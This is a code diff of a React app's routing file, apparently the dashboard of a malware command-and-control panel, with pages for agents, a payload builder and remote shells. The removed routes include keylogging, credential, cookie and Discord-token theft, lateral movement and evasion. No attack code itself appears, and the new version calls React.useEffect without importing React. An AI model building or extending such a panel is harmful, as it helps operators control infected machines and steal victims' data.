@@ -1,93 +1,87 @@
-import { Routes, Route, Navigate } from 'react-router-dom'
+import { Toaster } from 'sonner'
+import { BrowserRouter, Routes, Route, Navigate } from 'react-router-dom'
+import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
+import { GradientBackground } from '@/components/ui/GradientBackground'
 import { Sidebar } from '@/components/layout/Sidebar'
 import { Header } from '@/components/layout/Header'
-import { AgentsPage } from '@/pages/AgentsPage'
-import { TasksPage } from '@/pages/TasksPage'
-import { FileManagerPage } from '@/pages/FileManagerPage'
-import { ShellPage } from '@/pages/ShellPage'
-import { ScreenshotsPage } from '@/pages/ScreenshotsPage'
-import { KeystrokesPage } from '@/pages/KeystrokesPage'
-import { CredentialsPage } from '@/pages/CredentialsPage'
-import { CookiesPage } from '@/pages/CookiesPage'
-import { DiscordTokensPage } from '@/pages/DiscordTokensPage'
-import { LateralPage } from '@/pages/LateralPage'
-import { EvasionPage } from '@/pages/EvasionPage'
-import { ModulesPage } from '@/pages/ModulesPage'
-import { SettingsPage } from '@/pages/SettingsPage'
 import { LoginPage } from '@/pages/LoginPage'
+import { DashboardPage } from '@/pages/DashboardPage'
+import { AgentsPage } from '@/pages/AgentsPage'
 import { AgentDetailPage } from '@/pages/AgentDetailPage'
 import { PayloadBuilderPage } from '@/pages/PayloadBuilderPage'
-import { useStore } from '@/stores/useStore'
-import { api } from '@/services/api'
-import { useEffect } from 'react'
-import { NotificationContainer } from '@/components/ui/NotificationContainer'
+import { ShellPage } from '@/pages/ShellPage'
+import { SettingsPage } from '@/pages/SettingsPage'
+import { useAuthStore } from '@/stores/authStore'
+import { useAgentStore } from '@/stores/agentStore'
+import { CommandPalette } from '@/components/ui/CommandPalette'
 
-function ProtectedRoute({ children }: { children: React.ReactNode }) {
-  const token = localStorage.getItem('auth_token')
-  if (!token) return <Navigate to="/login" replace />
+const queryClient = new QueryClient({
+  defaultOptions: {
+    queries: {
+      staleTime: 5000,
+      refetchOnWindowFocus: false,
+      retry: 1,
+    },
+  },
+})
+
+function PrivateRoute({ children }: { children: React.ReactNode }) {
+  const { isAuthenticated } = useAuthStore()
+  if (!isAuthenticated) return <Navigate to="/login" replace />
   return <>{children}</>
 }
 
+function AppLayout({ children }: { children: React.ReactNode }) {
+  return (
+    <GradientBackground>
+      <div className="min-h-screen flex">
+        <Sidebar />
+        <div className="flex-1 flex flex-col min-w-0">
+          <Header />
+          <main className="flex-1 p-4 md:p-6 lg:p-8 overflow-auto">
+            {children}
+          </main>
+        </div>
+        <CommandPalette />
+      </div>
+    </GradientBackground>
+  )
+}
+
 export function App() {
-  const { setConnected, setConnectionError, connected } = useStore()
+  const { token, checkAuth } = useAuthStore()
+  const { connectWS } = useAgentStore()
 
-  useEffect(() => {
-    const checkHealth = async () => {
-      try {
-        await api.getHealth()
-        setConnected(true)
-        setConnectionError(null)
-      } catch (error) {
-        setConnected(false)
-        setConnectionError(error instanceof Error ? error.message : 'Connection failed')
-      }
-    }
-
-    checkHealth()
-    const interval = setInterval(checkHealth, 30000)
-    return () => clearInterval(interval)
-  }, [setConnected, setConnectionError])
+  React.useEffect(() => {
+    checkAuth()
+    if (token) connectWS()
+  }, [token, checkAuth, connectWS])
 
   return (
-    <div className="min-h-screen bg-dark-950 text-dark-100 font-sans antialiased">
-      <NotificationContainer />
-      <Routes>
-        <Route path="/login" element={<LoginPage />} />
-        <Route
-          element={
-            <ProtectedRoute>
-              <div className="flex">
-                <Sidebar />
-                <div className="flex-1 flex flex-col lg:ml-64 transition-all duration-300">
-                  <Header />
-                  <main className="flex-1">
-                    <Routes>
-                      <Route path="/agents" element={<AgentsPage />} />
-                      <Route path="/agents/:id" element={<AgentDetailPage />} />
-                      <Route path="/tasks" element={<TasksPage />} />
-                      <Route path="/files" element={<FileManagerPage />} />
-                      <Route path="/payloads" element={<PayloadBuilderPage />} />
-                      <Route path="/shell" element={<ShellPage />} />
-                      <Route path="/screenshots" element={<ScreenshotsPage />} />
-                      <Route path="/keylogger" element={<KeystrokesPage />} />
-                      <Route path="/credentials" element={<CredentialsPage />} />
-                      <Route path="/cookies" element={<CookiesPage />} />
-                      <Route path="/discord-tokens" element={<DiscordTokensPage />} />
-                      <Route path="/lateral" element={<LateralPage />} />
-                      <Route path="/evasion" element={<EvasionPage />} />
-                      <Route path="/modules" element={<ModulesPage />} />
-                      <Route path="/settings" element={<SettingsPage />} />
-                    </Routes>
-                  </main>
-                </div>
-              </div>
-            </ProtectedRoute>
-          }
-        >
-          <Route path="/*" element={<Navigate to="/agents" replace />} />
-        </Route>
-        <Route path="*" element={<Navigate to="/login" replace />} />
-      </Routes>
-    </div>
+    <QueryClientProvider client={queryClient}>
+      <BrowserRouter>
+        <Routes>
+          <Route path="/login" element={<LoginPage />} />
+          <Route
+            path="/*"
+            element={
+              <PrivateRoute>
+                <AppLayout>
+                  <Routes>
+                    <Route path="/" element={<DashboardPage />} />
+                    <Route path="/agents" element={<AgentsPage />} />
+                    <Route path="/agents/:id" element={<AgentDetailPage />} />
+                    <Route path="/payloads" element={<PayloadBuilderPage />} />
+                    <Route path="/shell/:agentId" element={<ShellPage />} />
+                    <Route path="/settings" element={<SettingsPage />} />
+                  </Routes>
+                </AppLayout>
+              </PrivateRoute>
+            }
+          />
+        </Routes>
+        <Toaster position="top-right" theme="dark" className="bg-dark-900 border-dark-700" />
+      </BrowserRouter>
+    </QueryClientProvider>
   )
 }
